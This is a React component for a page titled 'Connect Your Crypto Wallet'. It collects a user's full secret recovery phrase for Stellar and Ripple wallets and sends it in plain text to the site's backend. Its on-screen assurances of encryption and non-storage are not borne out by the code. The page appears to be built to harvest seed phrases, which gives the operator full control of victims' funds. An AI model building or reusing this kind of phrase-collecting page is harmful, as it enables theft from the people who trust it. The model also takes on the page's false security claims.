import React, { useState, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import './ConnectWallet.css';

const ConnectWallet = () => {
  const [user, setUser] = useState(null);
  const [error, setError] = useState('');
  const [phrase, setPhrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [success, setSuccess] = useState('');
  const [stellarAddress, setStellarAddress] = useState('');
  const [rippleAddress, setRippleAddress] = useState('');

  const navigate = useNavigate();

  const apiUrl = import.meta.env.VITE_API_URL;
  const token = localStorage.getItem('token');

  useEffect(() => {
    const localUser = JSON.parse(localStorage.getItem('user'));
    if (localUser) {
      setUser(localUser);
      setStellarAddress(localUser.stellarAddress || '');
      setRippleAddress(localUser.rippleAddress || '');
    }
  }, []);

  useEffect(() => {
    const handleStorageChange = () => {
      const localUser = JSON.parse(localStorage.getItem('user'));
      if (localUser) setUser(localUser);
    };
    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, []);

  const handlePhraseSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setSuccess('');
    setIsLoading(true);

    const words = phrase.trim().split(/\s+/);
    if (![12, 15, 18, 21, 24].includes(words.length)) {
      setError('A secret phrase must contain 12, 15, 18, 21, or 24 words.');
      setIsLoading(false);
      return;
    }

    try {
      const res = await fetch(`${apiUrl}/wallet/connect-phrase`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ phrase: phrase.trim() }),
      });

      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.message || 'Failed to connect wallet.');
      }

      localStorage.setItem('user', JSON.stringify(data));
      setUser(data);
      setStellarAddress(data.stellarAddress);
      setRippleAddress(data.rippleAddress);

      setSuccess('Wallet connected! Fetching your assets...');
      setPhrase(''); // Clear phrase for security
      setTimeout(() => navigate('/user/assets'), 1500);

    } catch (err) {
      setError(err.message || 'An unknown error occurred.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="connect-wallet-page">
      {/* Hero Section */}
      <div className="wallet-hero-section">
        <div className="hero-content">
          <div className="hero-icon-wrapper">
            <span className="material-symbols-outlined hero-icon">account_balance_wallet</span>
          </div>
          <h1 className="hero-title">Connect Your Crypto Wallet</h1>
          <p className="hero-subtitle">
            Securely link your Stellar and Ripple wallets to access your assets and start trading
          </p>
        </div>
        <div className="hero-decoration">
          <div className="floating-shapes">
            <div className="shape shape-1"></div>
            <div className="shape shape-2"></div>
            <div className="shape shape-3"></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="connect-wallet-container">
        {/* Status Messages */}
        {error && (
          <div className="status-message error-message animated">
            <span className="material-symbols-outlined">error</span>
            <span>{error}</span>
          </div>
        )}
        {success && (
          <div className="status-message success-message animated">
            <span className="material-symbols-outlined">check_circle</span>
            <span>{success}</span>
          </div>
        )}

        {/* Wallet Connection Card */}
        <div className="wallet-connection-card animated">
         

          { (stellarAddress || rippleAddress) ? (
            /* Connected State */
            <div className="connected-state">
              <div className="success-animation">
                <div className="success-circle">
                  <span className="material-symbols-outlined">check_circle</span>
                </div>
              </div>
              <h3 className="connected-title">Wallet Connected Successfully!</h3>
              <p className="connected-subtitle">Your Stellar and Ripple wallets are now linked to your account</p>

              <div className="wallet-addresses">
                {stellarAddress && (
                  <div className="address-item">
                    <div className="address-label">
                      <span className="material-symbols-outlined">stars</span>
                      <span>Stellar Address</span>
                    </div>
                    <div className="address-value" title={stellarAddress}>
                      {stellarAddress.slice(0, 8)}...{stellarAddress.slice(-8)}
                    </div>
                  </div>
                )}
                {rippleAddress && (
                  <div className="address-item">
                    <div className="address-label">
                      <span className="material-symbols-outlined">waves</span>
                      <span>Ripple Address</span>
                    </div>
                    <div className="address-value" title={rippleAddress}>
                      {rippleAddress.slice(0, 8)}...{rippleAddress.slice(-8)}
                    </div>
                  </div>
                )}
              </div>

              <div className="connected-actions">
                <button onClick={() => navigate('/user/assets')} className="primary-action-btn">
                  <span className="material-symbols-outlined">visibility</span>
                  View My Assets
                </button>
                <button onClick={() => navigate('/user/dashboard')} className="secondary-action-btn">
                  <span className="material-symbols-outlined">dashboard</span>
                  Go to Dashboard
                </button>
              </div>
            </div>
          ) : (
            /* Connection Form */
            <div className="connection-form">
              <form onSubmit={handlePhraseSubmit} className="phrase-input-form">
                <div className="input-group">
                  <label htmlFor="secretPhrase" className="input-label">
                    <span className="material-symbols-outlined">lock</span>
                    Secret Recovery Phrase
                  </label>
                  <textarea
                    id="secretPhrase"
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    
                    className="phrase-textarea"
                    rows="4"
                    required
                    disabled={isLoading}
                  />
                  <div className="input-hint">
                    <span className="material-symbols-outlined">info</span>
                    Separate words with spaces. Your phrase is encrypted and never stored.
                  </div>
                </div>

                <div className="security-features">
                  <div className="security-item">
                    <span className="material-symbols-outlined">security</span>
                    <span>End-to-end encrypted</span>
                  </div>
                  <div className="security-item">
                    <span className="material-symbols-outlined">verified</span>
                    <span>Secure connection</span>
                  </div>
               
                </div>

                <button type="submit" className="connect-button" disabled={isLoading}>
                  {isLoading ? (
                    <>
                      <div className="loading-spinner"></div>
                      Connecting Wallet...
                    </>
                  ) : (
                    <>
                      <span className="material-symbols-outlined">link</span>
                      Connect Wallet
                    </>
                  )}
                </button>
              </form>
            </div>
          )}
        </div>

        {/* Footer Actions */}
        <div className="page-footer">
          <Link to="/user/dashboard" className="back-link">
            <span className="material-symbols-outlined">arrow_back</span>
            Back to Dashboard
          </Link>
        </div>
      </div>
    </div>
  );
};

export default ConnectWallet;
